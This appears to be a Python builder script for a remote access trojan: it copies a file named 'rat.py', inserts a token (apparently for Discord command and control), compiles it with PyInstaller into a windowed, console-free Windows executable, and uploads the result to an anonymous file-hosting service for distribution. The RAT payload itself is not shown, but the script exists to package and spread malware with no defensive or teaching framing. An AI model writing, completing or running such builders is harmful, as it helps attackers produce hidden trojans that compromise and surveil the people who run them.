from anonfile import AnonFile
import shutil
from pathlib2 import Path
import PyInstaller
import os
#TODO dc config
def upload(filepath):
    file_up = AnonFile()
    up = file_up.upload(filepath)
    return str(up.url.geturl())
#TODO  try running this on a vm to fix the OSerror to try debug
def gen(token):
    src = r'rat.py'
    dest = 'hi.py'
    path = shutil.copyfile(src,dest)
    file = Path(r'hi.py')
    data = file.read_text()
    sr = '#Enteer'
    data = data.replace(sr,token)
    file.write_text(data)
    os.system("python -m PyInstaller --onefile --windowed --hidden-import=discord hi.py")
    print(upload(r'dist/hi.exe'))
    
gen('tkn')

